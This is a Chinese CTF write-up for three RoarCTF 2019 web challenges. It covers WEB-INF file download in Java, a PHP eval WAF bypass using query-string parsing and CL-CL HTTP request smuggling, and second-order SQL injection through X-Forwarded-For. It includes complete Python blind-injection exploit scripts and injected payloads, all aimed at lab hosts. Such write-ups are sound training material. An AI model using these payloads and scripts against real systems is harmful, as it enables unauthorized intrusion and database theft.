{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p>\n<p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p>\n<p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p>\n<h3 id=\"什么是-WEB-INF\"><a href=\"#什么是-WEB-INF\" class=\"headerlink\" title=\"什么是 WEB-INF\"></a>什么是 WEB-INF</h3><blockquote>\n<p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p>\n</li>\n</ol>\n<p>其他的配置文件介绍看<a href=\"https://baike.baidu.com/item/web-inf\" title=\"这里\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p>\n<p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p>\n<p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>右键查看源码</p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p>\n<ol>\n<li>利用字符串解析特性 Bypass</li>\n</ol>\n<p>原理看这篇文章：<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p>\n<p>这是测试php是如何处理特殊字符：</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p>\n<ol start=\"2\">\n<li>http协议走私攻击</li>\n</ol>\n<blockquote>\n<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>\n</blockquote>\n<p>这里我们通过 CL-CL 来Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p>\n<p>先学习几个函数</p>\n<ul>\n<li>ord — 返回字符的 ASCII 码值</li>\n<li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li>\n<li>hex2bin — 转换十六进制字符串为二进制字符串</li>\n<li>dechex — 十进制转换为十六进制</li>\n<li>base_convert — 在任意进制之间转换数字</li>\n<li>hexdec — 十六进制转换为十进制</li>\n</ul>\n<p>读取flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p>\n<p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p>\n<p>查看源码：</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p>\n<p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]请求语句：&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]长度：&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# 获取数据库\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# 获取表中内容\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}